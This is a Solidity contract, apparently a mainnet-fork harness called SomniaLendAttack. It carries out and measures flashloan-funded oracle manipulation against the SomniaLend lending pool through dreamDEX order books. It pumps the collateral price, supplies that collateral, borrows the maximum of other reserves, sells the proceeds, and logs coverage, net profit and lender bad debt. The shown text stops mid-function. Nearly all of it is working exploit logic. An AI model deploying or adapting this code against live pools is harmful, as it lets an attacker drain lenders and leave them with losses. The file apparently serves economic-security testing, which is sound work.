// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {console2} from "forge-std/console2.sol";
import {Economics} from "./Economics.sol";
import {DexMath} from "./Interfaces.sol";
import {
    IAaveOracle,
    IDreamDexSpotPool,
    IERC20,
    ISomniaLendPool,
    IWrappedNative,
    ReserveData,
    SomniaConfig,
    Step,
    SomniaMetrics
} from "./Interfaces.sol";

/// @notice Pinned mainnet-fork economic harness for SomniaLend + dreamDEX.
///         It has no owner withdrawal or arbitrary-call escape hatch: every state-changing route is
///         one of the measured scenarios below.
///
/// Modes:
///   A SOMI_PUMP_SUPPLY   flash USDso -> IOC bid SOMI/USDso -> wrap -> supply WSOMI -> borrow max USDso
///   C USDSO_PUMP_SUPPLY  flash USDC  -> IOC ask USDC/USDso -> supply USDso -> borrow max USDC
///
/// Both measured directions are the requested shape: pump the collateral asset on dreamDEX,
/// re-read the oracle inside the same callback, supply the acquired collateral and borrow the
/// opposite reserve. The mirror family (supply the flash asset, borrow the other one) is
/// structurally unrepayable: the flash principal would have to be locked as collateral, so it
/// can never be returned in the same transaction.
contract SomniaLendAttack {
    // Immutable but hardcoded for mainnet: `SomniaConfig.mainnet()` is the only configuration the
    // fork harness uses. The seam exists so the same bytecode can be rehearsed against mocks.
    address internal immutable POOL;
    address internal immutable ORACLE;

    address internal immutable WSOMI;
    address internal immutable USDC;
    address internal immutable WETH;
    address internal immutable USDSO;
    address internal immutable WBTC;

    address internal constant NATIVE = 0x28f34DeFd2b4CB48d9eE6d89f2Be4Bc601694c00;

    address internal immutable SOMI_USDSO;
    address internal immutable USDC_USDSO;
    address internal immutable WETH_USDSO;
    address internal immutable WBTC_USDSO;

    uint8 internal constant ORDER_IOC = 2;
    uint8 internal constant SELF_MATCH_CANCEL_TAKER = 0;
    uint256 internal constant BPS = 10_000;
    uint256 internal constant VARIABLE_DEBT = 2;

    enum Mode {
        NONE,
        SOMI_PUMP_SUPPLY,
        USDSO_PUMP_SUPPLY,
        CONTROL
    }

    struct Params {
        uint256 buyLimitBps; // max price paid, as bps of the best ask   (>10_000 crosses up)
        uint256 sellLimitBps; // min price accepted, as bps of the best bid (<10_000 crosses down)
        uint256 borrowBps; // fraction of available borrow power to use
        bool borrowAll; // also borrow every other enabled reserve
        bool exitBorrowed; // sell the borrowed asset into the book before repayment
    }

    error Shortfall(bytes metrics);
    /// @dev Any failure between the flashloan draw and the repayment pull is re-raised with the
    ///      metrics gathered so far, so a failed fork scenario is still a data point.
    error Aborted(bytes metrics, bytes inner);
    error NotOwner();
    error NotSelf();

    address public immutable owner;
    Mode public mode;
    bool public hasRun;
    Params public params;
    SomniaMetrics internal m;

    mapping(address => uint256) public borrowed;

    /// @dev Base-currency value of anything the test handed to this contract before the run.
    ///      Non-zero disables the profit claim: a funded run proves nothing about self-funding.
    uint256 public seededBase;

    event MetricsRecorded(bytes metrics);
    event Stage(
        string label,
        uint256 bestBid,
        uint256 bestAsk,
        uint256 collateralOracle,
        uint256 debtOracle
    );
    event Execution(string label, uint256 baseDelta, uint256 quoteDelta, uint256 execPrice, uint128 orderId);
    event Borrowed(address asset, uint256 amount, uint256 availableBaseBefore);

    constructor(SomniaConfig memory cfg) {
        owner = msg.sender;
        POOL = cfg.pool;
        ORACLE = cfg.oracle;
        WSOMI = cfg.wsomi;
        USDC = cfg.usdc;
        WETH = cfg.weth;
        USDSO = cfg.usdso;
        WBTC = cfg.wbtc;
        SOMI_USDSO = cfg.somiUsdso;
        USDC_USDSO = cfg.usdcUsdso;
        WETH_USDSO = cfg.wethUsdso;
        WBTC_USDSO = cfg.wbtcUsdso;
    }

    modifier onlyOwner() {
        if (msg.sender != owner) revert NotOwner();
        _;
    }

    receive() external payable {}

    /// @notice Declare tokens the test injected. Must be called before the run; it permanently
    ///         marks the run as non-zero-seed for reporting purposes.
    function declareSeed(address asset, uint256 amount) external onlyOwner {
        if (amount == 0) return;
        seededBase += _toBase(asset, amount, asset == NATIVE || asset == address(0) ? 18 : IERC20(asset).decimals());
        console2.log("SEEDED base (disables profit claim)", seededBase);
    }

    function _absorbExistingBalances() internal {
        uint256 total = _toBase(USDSO, IERC20(USDSO).balanceOf(address(this)), 18)
            + _toBase(USDC, IERC20(USDC).balanceOf(address(this)), 6)
            + _toBase(WETH, IERC20(WETH).balanceOf(address(this)), 18)
            + _toBase(WBTC, IERC20(WBTC).balanceOf(address(this)), 8)
            + _toBase(WSOMI, IERC20(WSOMI).balanceOf(address(this)), 18)
            + _toBase(NATIVE, address(this).balance, 18);
        // `declareSeed` may already have counted part of this; take the larger of the two views.
        if (total > seededBase) seededBase = total;
    }

    // ─────────────────────────────────────────────────────────────────────────────
    // Entry points
    // ─────────────────────────────────────────────────────────────────────────────

    function runControl(address flashAsset, uint256 flashAmount) external onlyOwner {
        _start(Mode.CONTROL, flashAsset, flashAmount, Params(BPS, BPS, 0, false, false));
        _stage("control-pre");
        ISomniaLendPool(POOL).flashLoanSimple(address(this), flashAsset, flashAmount, "", 0);
        _finish();
    }

    function runSomiPumpSupply(uint256 flashUsdso, Params calldata p) external onlyOwner {
        _start(Mode.SOMI_PUMP_SUPPLY, USDSO, flashUsdso, p);
        _stage("baseline");
        ISomniaLendPool(POOL).flashLoanSimple(address(this), USDSO, flashUsdso, "", 0);
        _finish();
    }

    function runUsdsoPumpSupply(uint256 flashUsdc, Params calldata p) external onlyOwner {
        _start(Mode.USDSO_PUMP_SUPPLY, USDC, flashUsdc, p);
        _stage("baseline");
        ISomniaLendPool(POOL).flashLoanSimple(address(this), USDC, flashUsdc, "", 0);
        _finish();
    }

    // ─────────────────────────────────────────────────────────────────────────────
    // Flashloan callback
    // ─────────────────────────────────────────────────────────────────────────────

    function executeOperation(address asset, uint256 amount, uint256 premium, address initiator, bytes calldata)
        external
        returns (bool)
    {
        require(msg.sender == POOL, "only Pool");
        require(initiator == address(this), "bad initiator");
        require(asset == m.flashAsset && amount == m.flashAmount, "unexpected flashloan");
        require(premium == m.flashPremium, "premium changed");

        if (mode == Mode.CONTROL) {
            _stage("control-same-tx");
        } else if (mode == Mode.SOMI_PUMP_SUPPLY) {
            try this.step() {} catch (bytes memory inner) {
                _recordStepFailure(Step.NODE_LIMIT, inner);
                revert Aborted(abi.encode(m), inner);
            }
        } else if (mode == Mode.USDSO_PUMP_SUPPLY) {
            try this.step() {} catch (bytes memory inner) {
                _recordStepFailure(Step.NODE_LIMIT, inner);
                revert Aborted(abi.encode(m), inner);
            }
        } else {
            revert("bad mode");
        }

        _recordBorrows();
        _recordCoverage();
        _recordPosition();

        // Aave pulls amount + premium right after this callback returns. If the attack cannot
        // fund it, the whole zero-seed transaction must revert; we still surface every metric.
        uint256 balance = IERC20(asset).balanceOf(address(this));
        if (balance < m.flashRepayment) {
            m.repaid = false;
            _recordLiquid();
            _recordLiquidValue();
            m.shortfallFlashAsset = m.flashRepayment - balance;
            uint256 price = IAaveOracle(ORACLE).getAssetPrice(asset);
            m.shortfallBase = (m.shortfallFlashAsset * price) / (10 ** IERC20(asset).decimals());
            console2.log("SHORTFALL units of flash asset", m.shortfallFlashAsset);
            console2.log("SHORTFALL base", m.shortfallBase);
            revert Shortfall(abi.encode(m));
        }
        _approve(asset, POOL, m.flashRepayment);
        m.repaid = true;
        return true;
    }

    /// @dev Isolated so the caller can catch a scenario failure and still report the metrics.
    ///      Only reachable through `this.step()` from inside the flashloan callback.
    function step() external {
        if (msg.sender != address(this)) revert NotSelf();
        if (mode == Mode.SOMI_PUMP_SUPPLY) {
            _somiPumpSupply();
        } else if (mode == Mode.USDSO_PUMP_SUPPLY) {
            _usdsoPumpSupply();
        }
    }

    // ─────────────────────────────────────────────────────────────────────────────
    // Scenario A: pump SOMI, supply WSOMI, borrow USDso
    // ─────────────────────────────────────────────────────────────────────────────

    function _somiPumpSupply() internal {
        (address base, address quote,,, uint256 tick, uint256 minQty, uint256 lot) =
            IDreamDexSpotPool(SOMI_USDSO).getPoolParams();
        require(base == NATIVE && quote == USDSO, "wrong SOMI/USDso market");

        _snapshotPre(WSOMI, USDSO, SOMI_USDSO);
        uint256 ask = m.bestAskBefore;
        require(ask > 0, "empty SOMI asks");

        uint256 limit = _limitPrice(ask, true, params.buyLimitBps, tick);
        uint256 quantity = _affordableBuy(SOMI_USDSO, limit, m.flashAmount, lot);
        require(quantity >= minQty, "SOMI qty below min");

        uint256 nativeBefore = address(this).balance;
        uint256 quoteBefore = IERC20(USDSO).balanceOf(address(this));
        uint128 orderId = _placeIoc(SOMI_USDSO, true, limit, quantity, USDSO, 0);
        uint256 quoteSpent = quoteBefore - IERC20(USDSO).balanceOf(address(this));
        // The fill is either pushed to the wallet or credited to the pool's internal vault; both
        // are fine, but it must be in the wallet before it can be wrapped.
        uint256 nativeDelta = address(this).balance - nativeBefore;
        if (nativeDelta == 0) _withdrawVault(SOMI_USDSO, NATIVE);
        nativeDelta = address(this).balance - nativeBefore;
        require(nativeDelta > 0 && quoteSpent > 0, "no SOMI fill");
        m.preTradeBaseTraded = nativeDelta;
        m.preTradeQuoteTraded = quoteSpent;
        m.preTradeExecPrice = (quoteSpent * 1e18) / nativeDelta;
        emit Execution("somi-buy", nativeDelta, quoteSpent, m.preTradeExecPrice, orderId);

        IWrappedNative(WSOMI).deposit{value: nativeDelta}();

        _snapshotPost(WSOMI, USDSO, SOMI_USDSO);
        _supply(WSOMI, nativeDelta);
        _borrowConfigured(USDSO, WSOMI);
        if (params.borrowAll) {
            if (borrowed[USDC] > 0) _exitAsset(USDC, USDC_USDSO, 6, false);
            if (borrowed[WETH] > 0) _exitAsset(WETH, WETH_USDSO, 18, false);
            if (borrowed[WBTC] > 0) _exitAsset(WBTC, WBTC_USDSO, 8, false);
        }
    }

    // ─────────────────────────────────────────────────────────────────────────────
    // Scenario C: sell USDC for USDso, supply USDso, borrow USDC
    // ─────────────────────────────────────────────────────────────────────────────

    function _usdsoPumpSupply() internal {
        (address base, address quote,,, uint256 tick, uint256 minQty, uint256 lot) =
            IDreamDexSpotPool(USDC_USDSO).getPoolParams();
        require(base == USDC && quote == USDSO, "wrong USDC/USDso market");

        _snapshotPre(USDSO, USDC, USDC_USDSO);
        uint256 bid = m.bestBidBefore;
        require(bid > 0, "empty USDC bids");

        uint256 limit = _limitPrice(bid, false, params.sellLimitBps, tick);
        uint256 quantity = _affordableSell(USDC_USDSO, limit, m.flashAmount, lot);
        require(quantity >= minQty, "USDC qty below min");

        uint256 baseBefore = IERC20(USDC).balanceOf(address(this));
        uint256 quoteBefore = IERC20(USDSO).balanceOf(address(this));
        uint128 orderId = _placeIoc(USDC_USDSO, false, limit, quantity, USDC, 0);
        uint256 baseSold = baseBefore - IERC20(USDC).balanceOf(address(this));
        uint256 quoteOut = IERC20(USDSO).balanceOf(address(this)) - quoteBefore;
        if (quoteOut == 0) {
            _withdrawVault(USDC_USDSO, USDSO);
            quoteOut = IERC20(USDSO).balanceOf(address(this)) - quoteBefore;
        }
        require(baseSold > 0 && quoteOut > 0, "no USDC fill");
        m.preTradeBaseTraded = baseSold;
        m.preTradeQuoteTraded = quoteOut;
        m.preTradeExecPrice = (quoteOut * 1e6) / baseSold;
        emit Execution("usdc-sell", baseSold, quoteOut, m.preTradeExecPrice, orderId);

        _snapshotPost(USDSO, USDC, USDC_USDSO);
        _supply(USDSO, quoteOut);
        _borrowConfigured(USDC, USDSO);
        // Borrowed USDC beyond the flash principal is sold into real bids. The principal itself
        // must stay in the wallet because the Pool pulls it immediately after the callback.
        if (params.exitBorrowed) _exitAsset(USDC, USDC_USDSO, 6, true);
        if (params.borrowAll) {
            if (borrowed[WETH] > 0) _exitAsset(WETH, WETH_USDSO, 18, false);
            if (borrowed[WBTC] > 0) _exitAsset(WBTC, WBTC_USDSO, 8, false);
        }
    }

    // ─────────────────────────────────────────────────────────────────────────────
    // Accounting helpers
    // ─────────────────────────────────────────────────────────────────────────────

    /// @notice Default parameter set used by the runner: cross up to 0.5% through the ask,
    ///         accept 0.5% through the bid, borrow 100% of available power.
    function defaultParams() public pure returns (Params memory) {
        return Params({buyLimitBps: 10_050, sellLimitBps: 9_950, borrowBps: 10_000, borrowAll: false, exitBorrowed: true});
    }

    function _start(Mode newMode, address flashAsset, uint256 flashAmount, Params memory p) internal {
        require(!hasRun, "one run per harness");
        require(flashAmount > 0, "zero flashloan");
        require(p.buyLimitBps > 0 && p.sellLimitBps > 0 && p.borrowBps <= BPS, "bad params");
        // Any balance already present was funded by the caller, so the run can never be reported
        // as self-funding. `declareSeed` may have set this already; this catches the rest.
        _absorbExistingBalances();
        hasRun = true;
        mode = newMode;
        params = p;
        m.mode = uint8(newMode);
        m.flashAsset = flashAsset;
        m.flashAmount = flashAmount;
        m.flashPremium = (flashAmount * ISomniaLendPool(POOL).FLASHLOAN_PREMIUM_TOTAL()) / BPS;
        m.flashRepayment = flashAmount + m.flashPremium;
        console2.log("mode", uint256(newMode));
        console2.log("flash asset", flashAsset);
        console2.log("flash amount", flashAmount);
        console2.log("flash premium", m.flashPremium);
    }

    function _stage(string memory label) internal {
        address collateral = _collateralAsset();
        uint256 bid;
        uint256 ask;
        if (collateral == WSOMI) {
            ask = _bestPrice(SOMI_USDSO, false);
            bid = _bestPrice(SOMI_USDSO, true);
        } else {
            bid = _bestPrice(USDC_USDSO, true);
            ask = _bestPrice(USDC_USDSO, false);
        }
        uint256 collateralPrice = collateral == address(0) ? 0 : IAaveOracle(ORACLE).getAssetPrice(collateral);
        uint256 debtPrice = IAaveOracle(ORACLE).getAssetPrice(m.flashAsset);
        console2.log("stage", label);
        console2.log("  best bid", bid);
        console2.log("  best ask", ask);
        console2.log("  collateral oracle", collateralPrice);
        console2.log("  debt oracle", debtPrice);
        emit Stage(label, bid, ask, collateralPrice, debtPrice);
    }

    function _collateralAsset() internal view returns (address) {
        if (mode == Mode.SOMI_PUMP_SUPPLY) return WSOMI;
        if (mode == Mode.USDSO_PUMP_SUPPLY) return USDSO;
        return address(0);
    }

    function _snapshotPre(address collateral, address debt, address pool) internal {
        m.collateralOracleBefore = IAaveOracle(ORACLE).getAssetPrice(collateral);
        m.debtOracleBefore = IAaveOracle(ORACLE).getAssetPrice(debt);
        (m.collateralFeedAnswerBefore, m.collateralFeedUpdatedAtBefore) = _feed(IAaveOracle(ORACLE).getSourceOfAsset(collateral));
        m.bestBidBefore = _bestPrice(pool, true);
        m.bestAskBefore = _bestPrice(pool, false);
    }

    function _snapshotPost(address collateral, address debt, address pool) internal {
        // Re-read the oracle inside the same transaction, after the DEX trade. This value is what
        // the Pool will use for the supply/borrow below; it is not a post-block oracle sample.
        m.collateralOracleAfter = IAaveOracle(ORACLE).getAssetPrice(collateral);
        m.oracleRereadCount += 1;
        m.debtOracleAfter = IAaveOracle(ORACLE).getAssetPrice(debt);
        (m.collateralFeedAnswerAfter, m.collateralFeedUpdatedAtAfter) =
            _feed(IAaveOracle(ORACLE).getSourceOfAsset(collateral));
        m.bestBidAfter = _bestPrice(pool, true);
        m.bestAskAfter = _bestPrice(pool, false);
        console2.log("collateral oracle before", m.collateralOracleBefore);
        console2.log("collateral oracle after", m.collateralOracleAfter);
        console2.log("debt oracle before", m.debtOracleBefore);
        console2.log("debt oracle after", m.debtOracleAfter);
        console2.log("dex best bid before/after", m.bestBidBefore, m.bestBidAfter);
        console2.log("dex best ask before/after", m.bestAskBefore, m.bestAskAfter);
        emit Stage("post-trade", m.bestBidAfter, m.bestAskAfter, m.collateralOracleAfter, m.debtOracleAfter);
    }

    function _feed(address source) internal view returns (int256 answer, uint256 updatedAt) {
        if (source == address(0)) return (0, 0);
        (bool ok, bytes memory data) = source.staticcall(abi.encodeWithSignature("latestRoundData()"));
        if (ok && data.length >= 160) {
            (, int256 a,, uint256 u,) = abi.decode(data, (uint80, int256, uint256, uint256, uint80));
            return (a, u);
        }
        (bool ok2, bytes memory d2) = source.staticcall(abi.encodeWithSignature("latestAnswer()"));
        if (ok2 && d2.length >= 32) answer = abi.decode(d2, (int256));
    }

    function _supply(address asset, uint256 amount) internal {
        require(amount > 0, "zero supply");
        m.suppliedCollateral = amount;
        m.collateralDecimals = IERC20(asset).decimals();
        _approve(asset, POOL, amount);
        ISomniaLendPool(POOL).supply(asset, amount, address(this), 0);
        _approve(asset, POOL, 0);

        uint256 cfg = ISomniaLendPool(POOL).getConfiguration(asset).data;
        uint256 ltv = cfg & 0xffff;
        m.ltvBps = ltv;
        m.liquidationThresholdBps = (cfg >> 16) & 0xffff;
        m.baselineBorrowPowerBase =
            (amount * m.collateralOracleBefore * ltv) / ((10 ** m.collateralDecimals) * BPS);
        (,, uint256 available,,,) = ISomniaLendPool(POOL).getUserAccountData(address(this));
        m.postSupplyAvailableBorrowsBase = available;
        console2.log("supplied", amount);
        console2.log("ltv bps", ltv);
        console2.log("liquidation threshold bps", m.liquidationThresholdBps);
        console2.log("baseline borrow power base", m.baselineBorrowPowerBase);
        console2.log("actual available borrow base", available);
    }

    function _borrowConfigured(address debtAsset, address collateral) internal {
        _borrowMaximum(debtAsset, collateral);
        m.debtBorrowedFlashAsset = borrowed[debtAsset];
        if (!params.borrowAll) return;

        address[5] memory others = [USDSO, USDC, WETH, WBTC, WSOMI];
        for (uint256 i; i < others.length; ++i) {
            address asset = others[i];
            if (asset == collateral || asset == debtAsset) continue;
            _borrowMaximum(asset, collateral);
        }
    }

    function _borrowMaximum(address asset, address collateral) internal {
        if (asset == collateral) return;
        uint256 config = ISomniaLendPool(POOL).getConfiguration(asset).data;
        bool active = (config >> 56) & 1 == 1;
        bool frozen = (config >> 57) & 1 == 1;
        bool borrowingEnabled = (config >> 58) & 1 == 1;
        if (!active || frozen || !borrowingEnabled) {
            console2.log("skip non-borrowable reserve", asset);
            return;
        }
        (,, uint256 availableBase,,,) = ISomniaLendPool(POOL).getUserAccountData(address(this));
        uint256 price = IAaveOracle(ORACLE).getAssetPrice(asset);
        if (price == 0) return;
        // 100% of available is right at HF == 1 on the Pool's own numbers; shave one part per
        // million so integer rounding in the Pool cannot make an intentional max borrow revert.
        uint256 budget = availableBase - (availableBase / 1_000_000) - 1;
        budget = (budget * params.borrowBps) / BPS;
        uint256 amount = (budget * (10 ** IERC20(asset).decimals())) / price;
        (address aToken, bool known) = _aTokenOf(asset);
        if (known) {
            uint256 cash = IERC20(asset).balanceOf(aToken);
            if (amount > cash) amount = cash;
            console2.log("  aToken cash", cash);
        } else {
            // Unknown wrapper: do not clamp. The reserve itself rejects an over-borrow, and the
            // step is isolated, so the worst case is a recorded failure rather than a silent skip.
            console2.log("  aToken unknown, not clamping");
        }
        console2.log("borrow candidate asset", asset);
        console2.log("  amount", amount);
        emit Borrowed(asset, amount, availableBase);
        if (amount == 0) return;
        try this.borrowStep(asset, amount) {
            borrowed[asset] += amount;
        } catch (bytes memory inner) {
            _recordStepFailure(Step.BORROW, inner);
        }
    }

    /// @dev Separate external function so a borrow that the reserve rejects is recorded per asset
    ///      instead of aborting the whole scenario.
    function borrowStep(address asset, uint256 amount) external {
        if (msg.sender != address(this)) revert NotSelf();
        ISomniaLendPool(POOL).borrow(asset, amount, VARIABLE_DEBT, 0, address(this));
    }

    function _recordStepFailure(uint16 which, bytes memory inner) internal {
        m.stepFailures += 1;
        m.lastErrorStep = which;
        m.lastErrorSelector = _selector(inner);
        console2.log("STEP FAILED", which);
        console2.log("  selector", uint32(m.lastErrorSelector));
    }

    function _selector(bytes memory inner) internal pure returns (bytes4 sel) {
        if (inner.length < 4) return bytes4(0);
        assembly {
            sel := mload(add(inner, 32))
        }
    }

    /// @dev Locates the aToken for a reserve without trusting a struct layout that may differ from
    ///      the deployed Aave version. Two independent routes, each self-validated by asking the
    ///      candidate `UNDERLYING_ASSET_ADDRESS()`: whatever we return provably belongs to `asset`.
    function _aTokenOf(address asset) internal view returns (address, bool) {
        (bool ok, bytes memory data) = POOL.staticcall(abi.encodeWithSignature("getReserveAToken(address)", asset));
        if (ok && data.length >= 32) {
            address candidate = abi.decode(data, (address));
            if (_underlyingOf(candidate) == asset) return (candidate, true);
        }

        (ok, data) = POOL.staticcall(abi.encodeWithSignature("getReserveData(address)", asset));
        if (ok && data.length >= 32) {
            // Every address in the tuple is word-aligned; accept the first word that proves it
            // wraps this exact underlying. No offset is assumed, so a layout change cannot
            // silently hand back the wrong token.
            for (uint256 i; i + 32 <= data.length; i += 32) {
                address candidate = address(uint160(uint256(_word(data, i))));
                if (_underlyingOf(candidate) == asset) return (candidate, true);
            }
        }
        return (address(0), false);
    }

    function _underlyingOf(address token) internal view returns (address underlying) {
        if (token == address(0) || token.code.length == 0) return address(0);
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSignature("UNDERLYING_ASSET_ADDRESS()"));
        if (ok && data.length >= 32) underlying = abi.decode(data, (address));
    }

    function _word(bytes memory data, uint256 offset) internal pure returns (uint256 out) {
        assembly {
            out := mload(add(add(data, 32), offset))
        }
    }

    function _recordBorrows() internal {
        m.borrowUsdso = borrowed[USDSO];
        m.borrowUsdc = borrowed[USDC];
        m.borrowWeth = borrowed[WETH];
        m.borrowWbtc = borrowed[WBTC];
        m.borrowWsomi = borrowed[WSOMI];
    }

    /// @dev The one number that decides whether the atomic round trip can work:
    ///      borrow power unlocked by the supplied collateral, versus what the flashloan demands
    ///      back. coverageBps > 10_000 is the necessary condition; anything else is a loss by
    ///      construction, no matter how far the DEX price moved.
    function _toBase(address asset, uint256 amount, uint8 decimals_) internal view returns (uint256) {
        if (amount == 0) return 0;
        // Native SOMI is the DEX sentinel, not a reserve, so it has no oracle price. It is the
        // base asset of SOMI/USDso, so it inherits WSOMI's price, which the Pool does publish.
        address priced = (asset == NATIVE || asset == address(0)) ? WSOMI : asset;
        return (amount * IAaveOracle(ORACLE).getAssetPrice(priced)) / (10 ** decimals_);
    }

    function _recordCoverage() internal {
        uint256 flashDecimals = IERC20(m.flashAsset).decimals();
        uint256 flashPrice = IAaveOracle(ORACLE).getAssetPrice(m.flashAsset);
        m.repaymentBase = (m.flashRepayment * flashPrice) / (10 ** flashDecimals);
        m.premiumBps = (m.flashPremium * BPS) / m.flashAmount;
        if (m.repaymentBase == 0) return;

        // Split of the effect: how much borrow power came from moving the price versus from the
        // units themselves. baselineBorrowPowerBase values the same collateral at the pre-trade
        // oracle, so the difference is pure price effect.
        m.borrowPowerInflationBase =
            int256(m.postSupplyAvailableBorrowsBase) - int256(m.baselineBorrowPowerBase);

        // Flash principal that never entered the trade. It sits in the wallet and is pulled back
        // with the rest, so it is not profit — but it is part of what the attacker controls at
        // the moment of repayment, which is why it belongs in the net.
        uint256 spent = m.mode == uint8(Mode.SOMI_PUMP_SUPPLY) ? m.preTradeQuoteTraded : m.preTradeBaseTraded;
        m.unspentFlashAsset = m.flashAmount > spent ? m.flashAmount - spent : 0;
        uint256 unspentBase = (m.unspentFlashAsset * IAaveOracle(ORACLE).getAssetPrice(m.flashAsset))
            / (10 ** flashDecimals);

        // Control runs trade nothing and borrow nothing: by construction their coverage is 1:1 and
        // their net is exactly minus the premium. Reporting the raw ratio would make the control
        // look like a 6035 bps attack, which is worse than useless.
        uint256 coverable = m.postSupplyAvailableBorrowsBase + unspentBase;
        // A control run trades nothing: it starts and ends with exactly the flash principal, so
        // its coverage is 1:1 less the premium by construction, in base currency.
        if (m.suppliedCollateral == 0) coverable = (m.flashAmount * flashPrice) / (10 ** flashDecimals);
        m.coverageBps = Economics.coverageBps(coverable, m.repaymentBase);
        m.maxNetBase = Economics.netBase(coverable, m.repaymentBase);
        m.edgeRequiredBps = Economics.edgeRequiredBps(m.ltvBps, m.premiumBps);

        // What the protocol says the bought collateral is worth, versus what was actually paid.
        if (m.suppliedCollateral > 0 && m.preTradeQuoteTraded > 0) {
            uint256 collateralValueBase =
                (m.suppliedCollateral * m.collateralOracleAfter) / (10 ** m.collateralDecimals);
            // Both measured directions pay in USDso (18 decimals); convert to base currency.
            uint256 paidBase = (m.preTradeQuoteTraded * IAaveOracle(ORACLE).getAssetPrice(USDSO)) / 1e18;
            m.unitEdgeBps = Economics.unitEdgeBps(collateralValueBase, paidBase);
            m.breakevenLtvBps = Economics.breakevenLtvBps(m.unitEdgeBps, m.premiumBps);
        }

        console2.log("unspent flash principal", m.unspentFlashAsset);
        console2.log("repayment base", m.repaymentBase);
        console2.log("borrow power base after supply", m.postSupplyAvailableBorrowsBase);
        console2.log("borrow power inflation base (price effect only)", m.borrowPowerInflationBase);
        console2.log("COVERAGE bps (>10000 is required)", m.coverageBps);
        console2.log("MAX NET ATOMIC base (borrow max - repay)", m.maxNetBase);
        console2.log("EDGE REQUIRED bps", m.edgeRequiredBps);
        console2.log("UNIT EDGE bps (oracle value vs paid)", m.unitEdgeBps);
        console2.log("BREAKEVEN LTV bps for this fill", m.breakevenLtvBps);
    }

    function _recordPosition() internal {
        (m.totalCollateralBase, m.totalDebtBase,,,, m.healthFactor) =
            ISomniaLendPool(POOL).getUserAccountData(address(this));
        m.debtIfCollateralZeroBase = m.totalDebtBase;

        // What the lender would lose if the attacker simply never came back: debt minus the
        // collateral it can seize, valued with the very oracle it lent against.
        m.badDebtBase = int256(m.totalDebtBase) - int256(m.totalCollateralBase);

        console2.log("bad debt base (debt - collateral, >0 = lender loss)", m.badDebtBase);
        console2.log("position collateral base", m.totalCollateralBase);
        console2.log("position debt base", m.totalDebtBase);
        console2.log("health factor", m.healthFactor);
    }

    // ─────────────────────────────────────────────────────────────────────────────
    // Post-borrow exits
    // ─────────────────────────────────────────────────────────────────────────────

    function _exitAsset(address asset, address pool, uint8 baseDecimals, bool keepRepayment) internal {
        uint256 balance = IERC20(asset).balanceOf(address(this));
        uint256 reserve = 0;
        if (keepRepayment && asset == m.flashAsset) reserve = m.flashRepayment;
        if (balance <= reserve) {
            console2.log("no exit surplus", asset);
            return;
        }
        uint256 surplus = balance - reserve;
        uint256 bestBid = _bestPrice(pool, true);
        if (bestBid == 0) return;
        (,,,, uint256 tick, uint256 minQty, uint256 lot) = IDreamDexSpotPool(pool).getPoolParams();
        uint256 quantity = (surplus / lot) * lot;
        if (quantity < minQty) {
            console2.log("exit below min quantity", surplus);
            return;
        }
        uint256 limit = _limitPrice(bestBid, false, params.sellLimitBps, tick);
        uint256 baseBefore = IERC20(asset).balanceOf(address(this));
        uint256 quoteBefore = IERC20(USDSO).balanceOf(address(this));
        uint128 orderId = _placeIoc(pool, false, limit, quantity, asset, 0);
        uint256 sold = baseBefore - IERC20(asset).balanceOf(address(this));
        uint256 proceeds = IERC20(USDSO).balanceOf(address(this)) - quoteBefore;
        m.exitBaseSold = sold;
        m.exitQuoteProceeds = proceeds;
        m.exitExecPrice = sold == 0 ? 0 : (proceeds * (10 ** baseDecimals)) / sold;
        console2.log("exit sold", sold);
        console2.log("exit USDso proceeds", proceeds);
        emit Execution("exit", sold, proceeds, m.exitExecPrice, orderId);
    }

    // ─────────────────────────────────────────────────────────────────────────────
    // DEX primitives
    // ─────────────────────────────────────────────────────────────────────────────

    function _placeIoc(
        address pool,
        bool isBid,
        uint256 limit,
        uint256 quantity,
        address expectedInput,
        uint256 nativeValue
    ) internal returns (uint128 orderId) {
        (address input, uint256 required,) =
            IDreamDexSpotPool(pool).getAutoPullRequirement(address(this), isBid, limit, quantity, 0);
        require(input == expectedInput, "unexpected DEX input");
        if (input == NATIVE) {
            require(nativeValue == required, "native value mismatch");
            require(address(this).balance >= required, "insufficient native");
        } else {
            require(nativeValue == 0, "unexpected native value");
            require(IERC20(input).balanceOf(address(this)) >= required, "insufficient DEX input");
            _approve(input, pool, required);
        }
        uint64 expiry = uint64((block.timestamp + 300) * 1e9);
        (bool success, uint128 id) = IDreamDexSpotPool(pool).placeOrder{value: nativeValue}(
            isBid, 0, limit, quantity, expiry, ORDER_IOC, SELF_MATCH_CANCEL_TAKER, address(0), 0
        );
        if (input != NATIVE) _approve(input, pool, 0);
        require(success, "DEX order rejected");
        return id;
    }

    /// @dev Sizes a market-buy against the real book instead of the limit price. Walking the
    ///      levels is what makes the sweep honest: the fill is bounded by depth *and* budget, and
    ///      the budget bound uses each level's own price, not the worst price we are willing to pay.
    function _affordableBuy(address pool, uint256 limit, uint256 budget, uint256 lot)
        internal
        view
        returns (uint256 quantity)
    {
        IDreamDexSpotPool.BookLevel[] memory asks = IDreamDexSpotPool(pool).getBookLevels(false, 50);
        uint256 spent;
        for (uint256 i; i < asks.length; ++i) {
            if (asks[i].price == 0 || asks[i].price > limit) break;
            uint256 levelCost = DexMath.quoteForBase(asks[i].price, asks[i].quantity, _baseDecimals(pool), _quoteDecimals(pool));
            if (spent + levelCost <= budget) {
                quantity += asks[i].quantity;
                spent += levelCost;
                continue;
            }
            uint256 afford = DexMath.baseForQuote(asks[i].price, budget - spent, _baseDecimals(pool), _quoteDecimals(pool));
            quantity += afford;
            break;
        }
        quantity = (quantity / lot) * lot;
        // The pool pulls an upper bound at the limit price; make sure that bound still fits.
        for (uint256 i; i < 4 && quantity > 0; ++i) {
            (, uint256 required,) =
                IDreamDexSpotPool(pool).getAutoPullRequirement(address(this), true, limit, quantity, 0);
            if (required <= budget) return quantity;
            quantity = (((quantity * budget) / required) / lot) * lot;
        }
        quantity = 0;
    }

    /// @dev Mirror of the above for a market-sell.
    function _affordableSell(address pool, uint256 limit, uint256 budget, uint256 lot)
        internal
        view
        returns (uint256 quantity)
    {
        IDreamDexSpotPool.BookLevel[] memory bids = IDreamDexSpotPool(pool).getBookLevels(true, 50);
        uint256 sold;
        for (uint256 i; i < bids.length; ++i) {
            if (bids[i].price == 0 || bids[i].price < limit) break;
            if (sold + bids[i].quantity <= budget) {
                sold += bids[i].quantity;
                continue;
            }
            sold = budget;
            break;
        }
        quantity = (sold / lot) * lot;
    }

    function _baseDecimals(address pool) internal view returns (uint8 d) {
        address base = _baseOf(pool);
